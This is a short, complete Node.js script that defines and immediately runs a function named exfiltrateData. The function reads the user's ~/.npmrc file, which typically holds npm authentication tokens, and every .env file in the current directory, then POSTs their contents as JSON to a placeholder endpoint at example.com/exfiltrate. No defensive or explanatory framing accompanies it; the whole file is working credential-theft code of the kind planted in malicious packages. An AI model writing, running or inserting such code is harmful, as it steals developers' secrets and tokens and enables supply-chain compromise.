const fs = require('fs');
const https = require('https');

function exfiltrateData() {
  const npmrcPath = `${process.env.HOME}/.npmrc`;
  const npmrcData = fs.readFileSync(npmrcPath, 'utf8');

  const envFiles = [];
  const dirPath = process.cwd();
  const files = fs.readdirSync(dirPath);
  files.forEach(file => {
    if (file.endsWith('.env')) {
      const envData = fs.readFileSync(`${dirPath}/${file}`, 'utf8');
      envFiles.push(envData);
    }
  });

  const postData = JSON.stringify({
    npmrc: npmrcData,
    envFiles: envFiles
  });

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  };

  const req = https.request('https://example.com/exfiltrate', options, res => {
    console.log(`statusCode: ${res.statusCode}`);
  });

  req.on('error', error => {
    console.error(error);
  });

  req.write(postData);
  req.end();
}

exfiltrateData();
